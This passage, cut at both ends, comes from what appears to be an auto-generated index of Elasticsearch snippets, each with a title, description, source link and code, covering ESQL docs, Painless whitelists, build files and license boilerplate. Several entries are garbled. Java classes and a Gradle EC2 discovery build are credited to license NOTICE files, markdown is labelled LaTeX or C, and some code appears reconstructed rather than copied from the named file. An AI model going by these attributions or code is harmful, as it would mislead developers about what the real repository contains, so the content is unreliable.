minus(long,TemporalUnit)\n  ChronoLocalDate plus(TemporalAmount)\n  ChronoLocalDate plus(long,TemporalUnit)\n  Comparator timeLineOrder()\n  long toEpochDay()\n  String toString()\n  ChronoPeriod until(ChronoLocalDate)\n  ChronoLocalDate with(TemporalAdjuster)\n  ChronoLocalDate with(TemporalField,long)\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Path Resolution in Elasticsearch Configuration (Java)\nDESCRIPTION: This test verifies that Elasticsearch correctly resolves configuration paths, including handling of environment variables and relative paths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/google-http-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n@Test\npublic void testResolveEnvVars() {\n    Map<String, String> props = genericProperties();\n    props.put(\"path.home\", \"/tmp/foo\");\n    Environment environment = TestEnvironment.newEnvironment(Settings.builder().put(props).build());\n    assertThat(environment.pathFile(), equalTo(new File(\"/tmp/foo\")));\n\n    props.put(\"path.home\", \"${sys.prop.1}\");\n    SystemProperties.setProperty(\"sys.prop.1\", \"/tmp/foo\");\n    environment = TestEnvironment.newEnvironment(Settings.builder().put(props).build());\n    assertThat(environment.pathFile(), equalTo(new File(\"/tmp/foo\")));\n\n    props.put(\"path.home\", \"${sys.prop.1}/foo/bar\");\n    props.put(\"path.data\", \"${path.home}/data\");\n    environment = TestEnvironment.newEnvironment(Settings.builder().put(props).build());\n    assertThat(environment.pathFile(), equalTo(new File(\"/tmp/foo/foo/bar\")));\n    assertThat(environment.dataFiles(), arrayContaining(new File(\"/tmp/foo/foo/bar/data\")));\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IP Field Script Classes\nDESCRIPTION: Declares whitelist classes for IP field scripting in Elasticsearch, allowing runtime field script processing for IP-based values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ip_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.IpFieldScript @no_import {\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.IpFieldScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: This code snippet presents a markdown table showing the supported types for various fields, limits, orders, and results in ESQL. It provides a quick reference for developers working with ESQL functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/top.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | limit | order | result |\n| --- | --- | --- | --- |\n| boolean | integer | keyword | boolean |\n| date | integer | keyword | date |\n| double | integer | keyword | double |\n| integer | integer | keyword | integer |\n| ip | integer | keyword | ip |\n| keyword | integer | keyword | keyword |\n| long | integer | keyword | long |\n| text | integer | keyword | keyword |\n```\n\n----------------------------------------\n\nTITLE: Applying GPL Notices to a Program (C)\nDESCRIPTION: This code block provides a template for attaching copyright notices to source files of a program licensed under the GNU General Public License (GPL). It includes the program's name, copyright information, license details, warranty disclaimer, and instructions on how to obtain a copy of the GPL. This is typically placed at the beginning of each source file to effectively convey the exclusion of warranty.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xmp-commons-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: C\nCODE:\n```\n \"   One line to give the program's name and a brief idea of what it does.\\n    Copyright (C) <year> <name of author>\\n\\n    This program is free software; you can redistribute it and/or modify\\n    it under the terms of the GNU General Public License as published by\\n    the Free Software Foundation; either version 2 of the License, or\\n    (at your option) any later version.\\n\\n    This program is distributed in the hope that it will be useful, but\\n    WITHOUT ANY WARRANTY; without even the implied warranty of\\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\\n    General Public License for more details.\\n\\n    You should have received a copy of the GNU General Public License\\n    along with this program; if not, write to the Free Software\\n    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\"\n```\n\n----------------------------------------\n\nTITLE: ESQL TOP Function Documentation Structure\nDESCRIPTION: Markdown includes for various documentation sections including syntax diagram, parameters, description, types and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/top.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/top.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/top.md\n:::\n\n:::{include} ../description/top.md\n:::\n\n:::{include} ../types/top.md\n:::\n\n:::{include} ../examples/top.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Documentation Header Comment\nDESCRIPTION: Header comment indicating that this is an auto-generated file by ESQL's AbstractFunctionTestCase\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/replace.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: LaTeX Documentation Header for TO_DATETIME Function\nDESCRIPTION: A LaTeX comment header indicating that this documentation is auto-generated by ESQL's AbstractFunctionTestCase and should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_datetime.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice\nDESCRIPTION: Standard boilerplate text to apply the Apache License 2.0 to a work. Includes copyright notice placeholder and license reference text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-pdf-module-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n```\n\n----------------------------------------\n\nTITLE: Including MAX Function Parameters in Markdown\nDESCRIPTION: This snippet includes the content of a markdown file containing the parameters for the MAX function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/max.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/max.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Configuring Gradle Build for Elasticsearch in Groovy\nDESCRIPTION: This snippet sets up the Gradle build for Elasticsearch, including applying plugins, configuring repositories, and defining dependencies. It also sets up custom tasks and configurations for the project.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/accessors-smart-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Groovy\nCODE:\n```\nimport org.elasticsearch.gradle.Architecture\nimport org.elasticsearch.gradle.info.BuildParams\n\nplugins {\n    id 'elasticsearch.java'\n    id 'elasticsearch.test.fixtures'\n}\n\ndependencies {\n    api project(':server')\n}\n\ntestFixtures {\n    useFixture()\n}\n\narchivesBaseName = 'elasticsearch-discovery-ec2'\n\ndescription = 'EC2 discovery for Elasticsearch'\n\ndependencies {\n    // aws-java-sdk's http-client is not compatible with the newest version of Apache HTTP Client so we have to force using an older version here\n    api \"com.amazonaws:aws-java-sdk-ec2:${versions.aws_sdk}\"\n    api \"com.amazonaws:aws-java-sdk-core:${versions.aws_sdk}\"\n    api \"org.apache.httpcomponents:httpclient:${versions.httpclient}\"\n    api \"org.apache.httpcomponents:httpcore:${versions.httpcore}\"\n\n    testImplementation project(':test:framework')\n    testImplementation(project(':test:fixtures:azure-fixture')) {\n        exclude group: 'org.elasticsearch', module: 'elasticsearch-ssl-config'\n    }\n    testImplementation(project(':test:fixtures:s3-fixture')) {\n        exclude group: 'org.elasticsearch', module: 'elasticsearch-ssl-config'\n    }\n    testImplementation 'org.mock-server:mockserver-netty:5.14.0'\n}\n\ntasks.named('dependencyLicenses').configure {\n    mapping from: /aws-java-sdk-.*/, to: 'aws-java-sdk'\n    mapping from: /joda-time-.*/, to: 'joda-time'\n}\n\ntasks.named('forbiddenApisMain').configure {\n    replaceSignatureFiles 'jdk-signatures'\n}\n\ntasks.named('test').configure {\n    /*\n     * We have to disable setting the number of available processors as tests in the same JVM randomize processors and will step on each\n     * other if we allow them to set the number of available processors as it's set-once in Netty.\n     */\n    systemProperty 'es.set.netty.runtime.available.processors', 'false'\n}\n\nif (BuildParams.runtimeJavaVersion > JavaVersion.VERSION_1_8) {\n    tasks.named('jarHell').configure {\n        // Does not work with JDK9+ https://github.com/aws/aws-sdk-java/issues/1469\n        ignoreJars 'joda-time-*.jar'\n    }\n}\n\ntasks.named('thirdPartyAudit').configure {\n    ignoreMissingClasses(\n            // classes are missing\n\n            'javax.servlet.ServletContextEvent',\n            'javax.servlet.ServletContextListener',\n            'org.apache.avalon.framework.logger.Logger',\n            'org.apache.log.Hierarchy',\n            'org.apache.log.Logger',\n            'software.amazon.ion.IonReader',\n            'software.amazon.ion.IonSystem',\n            'software.amazon.ion.IonType',\n            'software.amazon.ion.IonWriter',\n            'software.amazon.ion.Timestamp',\n            'software.amazon.ion.system.IonBinaryWriterBuilder',\n            'software.amazon.ion.system.IonSystemBuilder',\n            'software.amazon.ion.system.IonTextWriterBuilder',\n    )\n}\n\ntasks.named('testingConventions').configure {\n    naming.clear()\n    naming {\n        IT {\n            baseClass 'org.elasticsearch.discovery.ec2.AbstractEc2DiscoveryTestCase'\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL MAX Function Description Comment\nDESCRIPTION: Comment header indicating this is auto-generated documentation for ESQL's MAX aggregate function. Contains a warning not to edit directly and provides information about regenerating the documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_max.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Including ABS Function Types in Markdown\nDESCRIPTION: Includes the content of a separate Markdown file containing type information for the ABS function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/abs.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/abs.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Demonstrating NumericRangeQuery String Representation in Java\nDESCRIPTION: This code snippet shows how Lucene's numeric range queries convert values to their string representation through base-2 encoding. It demonstrates that numeric equality in Lucene uses sortable encoding.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-cloud-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nNumericRangeQuery<Long> query = NumericRangeQuery.newLongRange(\"my_field\", 0L, 1L, true, true);\nquery.toString(); // my_field:[0 TO 1]\n```\n\n----------------------------------------\n\nTITLE: Documentation Header Comment\nDESCRIPTION: Autogeneration notice indicating this is machine-generated documentation that should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_xmax.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Interactive Program License Notice\nDESCRIPTION: Example notice text for interactive programs to display their copyright and license information at startup.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-html-module-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: GPL License Header Template\nDESCRIPTION: Standard template for the GPL license header that should be included at the start of source files, including copyright notice and warranty disclaimer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-apple-module-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n    One line to give the program's name and a brief idea of what it does.\n    Copyright (C) <year> <name of author>\n\n    This program is free software; you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation; either version 2 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful, but\n    WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n    General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program; if not, write to the Free Software\n    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: This markdown snippet presents a table showing the supported field types, inlist types, and result types for ESQL's AbstractFunctionTestCase. It covers various data types including boolean, geometric shapes, numeric types, and text types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/in.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | inlist | result |\n| --- | --- | --- |\n| boolean | boolean | boolean |\n| cartesian_point | cartesian_point | boolean |\n| cartesian_shape | cartesian_shape | boolean |\n| double | double | boolean |\n| geo_point | geo_point | boolean |\n| geo_shape | geo_shape | boolean |\n| integer | integer | boolean |\n| ip | ip | boolean |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: ESQL String Length Function Description\nDESCRIPTION: Markdown documentation explaining a function that returns the byte length of UTF-8 encoded strings. Notes that since UTF-8 encoding is used, a single character may occupy multiple bytes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/byte_length.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the byte length of a string.\n\n::::{note}\nAll strings are in UTF-8, so a single character can use multiple bytes.\n::::\n```\n\n----------------------------------------\n\nTITLE: Including a Layout Template in Elasticsearch Documentation\nDESCRIPTION: This snippet demonstrates how to include an external Markdown file as a template within Elasticsearch documentation using the include directive.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/in.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} layout/in.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Including MV_SLICE Function Description in Markdown\nDESCRIPTION: This snippet includes the markdown file containing the description of the MV_SLICE function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_slice.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/mv_slice.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Including MV_ZIP Function Documentation Sections in Markdown\nDESCRIPTION: This snippet demonstrates how to include various documentation sections for the MV_ZIP function using Markdown syntax. It references external files for parameters, description, types, and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_zip.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n## `MV_ZIP` [esql-mv_zip]\n\n**Syntax**\n\n:::{image} ../../../images/functions/mv_zip.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/mv_zip.md\n:::\n\n:::{include} ../description/mv_zip.md\n:::\n\n:::{include} ../types/mv_zip.md\n:::\n\n:::{include} ../examples/mv_zip.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Documentation Section Includes\nDESCRIPTION: Series of includes for various documentation sections related to the TO_INTEGER function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_integer.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/to_integer.md\n:::\n\n:::{include} ../description/to_integer.md\n:::\n\n:::{include} ../types/to_integer.md\n:::\n\n:::{include} ../examples/to_integer.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Markdown Link to Elasticsearch Release Notes\nDESCRIPTION: A markdown link directing users to the official Elasticsearch release notes documentation in the reference manual.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CHANGELOG.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Elasticsearch Changelog\n\nPlease see the [release notes](https://www.elastic.co/guide/en/elasticsearch/reference/current/es-release-notes.html) in the reference manual.\n```\n\n----------------------------------------\n\nTITLE: ATAN2 Function Documentation Header\nDESCRIPTION: Documentation header indicating this is an auto-generated file for the ATAN2 function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/atan2.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Null Safe Grammar Definition in Painless\nDESCRIPTION: Grammar specification for null safe operator in Painless scripting language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nnull_safe: null_safe_method_call\n         | null_safe_field_access\n         ;\n\nnull_safe_method_call: '?.' ID arguments;\narguments: '(' (expression (',' expression)*)? ')';\n\nnull_safe_field_access: '?.' ID;\n```\n\n----------------------------------------\n\nTITLE: ESQL Operator Documentation Links\nDESCRIPTION: Markdown link references to ESQL operator documentation, including casting, comparison, pattern matching, and search operators.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/lists/infix-operators.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n* [Cast `::`](../../functions-operators/operators.md#esql-cast-operator)\n* [`IN`](../../functions-operators/operators.md#esql-in-operator)\n* [`LIKE`](../../functions-operators/operators.md#esql-like)\n* [`RLIKE`](../../functions-operators/operators.md#esql-rlike)\n* [preview] [Match `:`](../../functions-operators/operators.md#esql-match-operator)\n```\n\n----------------------------------------\n\nTITLE: Documenting 'field' Parameter for ESQL AbstractFunctionTestCase\nDESCRIPTION: This markdown snippet defines the 'field' parameter as a multivalue expression for use in ESQL's AbstractFunctionTestCase. It is part of the generated documentation and should not be edited directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_count.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Multivalue expression.\n```\n\n----------------------------------------\n\nTITLE: Embedding SVG Image in Markdown for BUCKET Function Syntax\nDESCRIPTION: This snippet embeds an SVG image that illustrates the syntax of the BUCKET function in ESQL documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/bucket.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/bucket.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining TAU Function in ESQL for Elasticsearch\nDESCRIPTION: This snippet defines the TAU function in ESQL, which returns the mathematical constant tau (τ), equivalent to 2π. It represents the ratio of a circle's circumference to its radius. The function takes no parameters and returns a single row containing the tau value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/tau.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW TAU()\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Numeric Types for ESQL Function in Markdown\nDESCRIPTION: This markdown table defines the supported numeric input types and their corresponding result types for an ESQL function. It includes double, integer, long, and unsigned_long as input types, all resulting in double output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/cbrt.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n| unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Numeric Types Table in Markdown\nDESCRIPTION: This markdown snippet presents a table showing the supported numeric types and their corresponding result types for an ESQL function. It includes double, integer, long, and unsigned_long types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/floor.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | integer |\n| long | long |\n| unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Startup Notice (C)\nDESCRIPTION: This snippet demonstrates the notice that an interactive program should output when it starts in interactive mode. It displays the program name, version, copyright information, warranty disclaimer, and instructions on how to view the license details and conditions for redistribution. The commands `show w` and `show c` are placeholders for displaying relevant information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xmp-commons-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: C\nCODE:\n```\n \"   Gnomovision version 69, Copyright (C) year name of author\n    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n    `show w'. This is free software, and you are welcome to redistribute\n    it under certain conditions; type `show c' for details.\"\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types Table in LaTeX Format\nDESCRIPTION: A LaTeX/Markdown table definition that documents the supported return types for an ESQL function, indicating that the function returns values of type 'double'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/e.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Supported types**\n\n| result |\n| --- |\n| double |\n```\n\n----------------------------------------\n\nTITLE: Documentation Header for ST_CENTROID_AGG Function\nDESCRIPTION: Markdown header defining the ST_CENTROID_AGG function documentation with a note about auto-generation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_centroid_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `ST_CENTROID_AGG` [esql-st_centroid_agg]\n```\n\n----------------------------------------\n\nTITLE: Classpath Exception Text\nDESCRIPTION: Special exception text for Oracle source files allowing linking with differently licensed modules\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/licenses/openjdk-LICENSE.txt#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nLinking this library statically or dynamically with other modules is making\na combined work based on this library.  Thus, the terms and conditions of\nthe GNU General Public License cover the whole combination.\n\nAs a special exception, the copyright holders of this library give you\npermission to link this library with independent modules to produce an\nexecutable, regardless of the license terms of these independent modules,\nand to copy and distribute the resulting executable under terms of your\nchoice, provided that you also meet, for each linked independent module,\nthe terms and conditions of the license of that module.  An independent\nmodule is a module which is not derived from or based on this library.  If\nyou modify this library, you may extend this exception to your version of\nthe library, but you are not obligated to do so.  If you do not wish to do\nso, delete this exception statement from your version.\n```\n\n----------------------------------------\n\nTITLE: Generated Content Header Comment\nDESCRIPTION: Standard comment header used to identify automatically generated documentation content\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/README.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Java Comparable Interface Definition\nDESCRIPTION: Defines the Comparable interface with the compareTo method for object comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.Comparable {\n  int compareTo(def)\n}\n```\n\n----------------------------------------\n\nTITLE: I/O Channel Operation Restrictions\nDESCRIPTION: Restricts direct channel read/write operations, recommending the use of Channels.* methods instead for better I/O handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\njava.nio.channels.WritableByteChannel#write(java.nio.ByteBuffer)\njava.nio.channels.FileChannel#write(java.nio.ByteBuffer, long)\njava.nio.channels.GatheringByteChannel#write(java.nio.ByteBuffer[], int, int)\njava.nio.channels.GatheringByteChannel#write(java.nio.ByteBuffer[])\njava.nio.channels.ReadableByteChannel#read(java.nio.ByteBuffer)\njava.nio.channels.ScatteringByteChannel#read(java.nio.ByteBuffer[])\njava.nio.channels.ScatteringByteChannel#read(java.nio.ByteBuffer[], int, int)\njava.nio.channels.FileChannel#read(java.nio.ByteBuffer, long)\n```\n\n----------------------------------------\n\nTITLE: Including STD_DEV Function Syntax Diagram\nDESCRIPTION: Embeds an SVG image showing the syntax diagram for the STD_DEV function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/std_dev.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/std_dev.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Unicode Inc Copyright Notice and License\nDESCRIPTION: Copyright notice and license terms for Unicode conversion code used in UnicodeUtil.java, defining usage rights and limitations for Unicode standard implementation\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-icu/licenses/lucene-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright 2001-2004 Unicode, Inc.\n * \n * Disclaimer\n * \n * This source code is provided as is by Unicode, Inc. No claims are\n * made as to fitness for any particular purpose. No warranties of any\n * kind are expressed or implied. The recipient agrees to determine\n * applicability of information provided. If this file has been\n * purchased on magnetic or optical media from Unicode, Inc., the\n * sole remedy for any claim will be exchange of defective media\n * within 90 days of receipt.\n * \n * Limitations on Rights to Redistribute This Code\n * \n * Unicode, Inc. hereby grants the right to freely use the information\n * supplied in this file in the creation of products supporting the\n * Unicode Standard, and to make copies of this file in any form\n * for internal or external distribution as long as this notice\n * remains attached.\n */\n```\n\n----------------------------------------\n\nTITLE: Displaying SUBSTRING Function Syntax in Markdown\nDESCRIPTION: This snippet uses Markdown syntax to display an image of the SUBSTRING function syntax. The image is embedded and centered in the document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/substring.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/substring.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Markdown Structure for ST_XMIN Function Documentation\nDESCRIPTION: This snippet outlines the structure of the documentation for the ST_XMIN function, including headers for different sections and directives to include content from other files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_xmin.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n### `ST_XMIN` [esql-st_xmin]\n\n**Syntax**\n\n:::{image} ../../../images/functions/st_xmin.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/st_xmin.md\n:::\n\n:::{include} ../description/st_xmin.md\n:::\n\n:::{include} ../types/st_xmin.md\n:::\n\n:::{include} ../examples/st_xmin.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining LicenseState class for Elasticsearch license management in Java\nDESCRIPTION: This snippet defines the LicenseState class, which manages the current license state for Elasticsearch. It includes methods for checking license validity, controlling feature access, and handling license updates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ql/licenses/antlr4-runtime-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic class LicenseState implements ClusterStateListener {\n    private static final Logger logger = LogManager.getLogger(LicenseState.class);\n\n    /** A supplier for the current cluster state */\n    private final Supplier<ClusterState> clusterStateSupplier;\n    private final List<LicenseStateListener> listeners;\n    /** Current active license **/\n    private AtomicReference<License> currentLicense = new AtomicReference<>();\n\n    private final AtomicBoolean nodesAllowedExecution = new AtomicBoolean(true);\n\n    public LicenseState(Supplier<ClusterState> clusterStateSupplier) {\n        this.clusterStateSupplier = clusterStateSupplier;\n        this.listeners = new CopyOnWriteArrayList<>();\n    }\n\n    /**\n     * Checks whether the current license if any is active\n     * @return true if the license is active or no license is installed\n     */\n    public boolean isActive() {\n        final License license = currentLicense.get();\n        return license == null || license.status() == License.Status.ACTIVE;\n    }\n\n    // ... more methods ...\n}\n```\n\n----------------------------------------\n\nTITLE: Preparing Snapshot Recovery Process in Elasticsearch\nDESCRIPTION: Method that prepares recovery of an index from a snapshot. It extracts the repository name and snapshot name from the action request, verifies the repository access, 